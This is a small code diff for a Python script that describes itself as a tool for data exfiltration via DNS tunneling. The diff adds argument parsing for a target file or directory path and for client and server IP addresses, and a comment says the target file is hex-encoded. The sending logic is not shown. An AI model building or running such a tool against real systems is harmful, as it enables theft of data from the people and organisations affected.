@@ -5,10 +5,10 @@
 import argparse
 import subprocess 
 
-#argparser.argparse blah blah 
-#arg -p --path, required=true blah blah
-#arg -t --target, required=true blah blah 
-#arg -
+parser = argparse.ArgumentParser(description="Data exfiltration via DNS tunneling")
+parser.add_argument("-p", "--path", type=str, required=True, help="File-path/Directory-Path for targeted exfiltration")
+parser.add_argument("-c", "--client", type=str, required=False, help="Client IP to listen for")
+parser.add_argument("-s", "--server", type=str, required=False, help="Server IP to send data to")
 
 #Read target file, and encode contents in hexadecimal
 def read_and_encode_file(file_path):
